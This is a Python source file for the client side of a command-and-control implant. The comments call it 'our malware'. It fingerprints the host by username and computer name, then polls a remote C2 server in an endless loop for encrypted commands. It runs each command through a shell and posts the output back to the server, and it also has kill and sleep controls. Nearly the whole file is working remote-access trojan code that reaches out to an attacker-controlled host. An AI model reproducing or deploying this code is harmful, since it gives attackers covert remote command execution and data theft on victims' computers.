"""
Command & Control Client Side Coding
Author: Davood Yahay(D.Yakuza)
"""
# Import os methods based on OS, use platform.system() to detect OS
from platform import system
# Import for Windows Builds only
if system() == "Windows":
    from os import getenv, chdir, path, getcwd
# Import for Linux Builds only
elif system() == "Linux":
    from os import getenv, uname, chdir, path, getcwd

# Import for both Linux & Windows Builds
from requests import get, exceptions, post
# Custom Features Import
from colorama import Fore
from time import time, sleep
from subprocess import run, PIPE, STDOUT
from encryption import cipher
# Settings Variables(Constants) Importing
from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY,
                      C2_SERVER, DELAY, PORT, PROXY, HEADERS)

# If Client have Windows OS
if system() == "Windows":
    # For Windows obtain a unique identifying Information
    client = (getenv("USERNAME","Unknown-Username") + "@" +
              getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time()))

# Elif Client have Linux OS
elif system() == "Linux":
    # For Linux, get a unique identifying Information
    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())

# If OS is not windows or linux, use a Linux version of the client
else:
    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())

encryptedClient = cipher.encrypt(client.encode()).decode()

# Print C2 Client Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)

def post_to_server(message, response_path=RESPONSE):
    """function to post data to C2 Server, accept message and response path
	optional as arguments"""
    try:
        # Byte encoding message and then encrypt it before POSTING
        message = cipher.encrypt(message.encode())

        # Post encoded encrypted message to Server via response_path address
        post(f"http://{C2_SERVER}:{PORT}{response_path}",
             data={RESPONSE_KEY:message},
             headers=HEADERS, proxies=PROXY)

    except exceptions.RequestException:
        return


#Better use infinity loop when add control active sessions feature in Server Side
while True:
    '''Try an http get requests to the C2 Server and retrieve command;
	if failed, Keep Trying forever.'''
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)

        # if we got 404 status codes, raise an exception to jump to except block
        if response.status_code == 404:
            raise exceptions.RequestException

    except exceptions.RequestException:
        #print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
        try:
            sleep(DELAY)
            continue #jump to the last iteration of the loop(while True:)
        except KeyboardInterrupt:
            print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
            exit()
    except KeyboardInterrupt:
        print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
        exit()
    except Exception as e:
        print(Fore.LIGHTYELLOW_EX+"\n[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
        print(f'Error Content: {e}')
        exit()

    # Retrieve the command from response and decode it 
    command = cipher.decrypt(response.content).decode()

    # Check if the command is cd without any input path, change to home directory
    if len(command) == 2 and command == "cd":
        homeDirectory = path.expanduser("~")
        chdir(homeDirectory)
        post_to_server(homeDirectory,CWD_RESPONSE)

    # if the Command is cd follow below blocks, first check cd with an input path
    if command.startswith("cd "):
        # Splicing the command to remove the cd and the extract directory path
        directory = command[3:]

        # Try to Change Directory and handle the error if it occurs
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"No such directory {directory}.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory")
        except PermissionError:
            post_to_server(f"You have don't Permission to Access{directory}.\n")
        except OSError:
            post_to_server("There was a Operation System Error on client.\n")
        # If not error, send the current directory to the server for using in Prompt
        else:
            post_to_server(getcwd(),CWD_RESPONSE)

    #the client Kill Command shutdown our malware
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been Killed. \n")
        exit()
    # the client sleep SECOND command will sleep the client for number of seconds
    elif command.startswith("client sleep "):
        # Slicing the command to remove the client sleep and the extract delay
        try:
            delay = float(command.split()[2])
            # if delay under zero raise ValueError
            if delay < 0:
                raise ValueError
        # Handle ValueError & IndexError Exceptions
        except (IndexError, ValueError):
            post_to_server("You must Enter a Positive Number for Sleep Delay in Seconds.\n")

        # if No Excepts happens, sleep the client for the delay seconds and send a message to the server
        else:
            post_to_server(f"{client} go to Sleep for {delay} seconds.\n")
            sleep(delay)
            # After sleep, client awake and then send a client awake message to the server
            post_to_server(f"{client} is now Awake.\n")

    # Run command using subprocess.run module
    else:
        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(commandOutput.stdout.decode())
        # post_to_server(commandOutput.stdout.decode())

    print("[+] Command Executed and Result send to C2 Server.")
    print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
    

print(Fore.LIGHTCYAN_EX+f"[+] Goodbye & Goodluck Ninja 🥷\n{client}"+Fore.RESET)



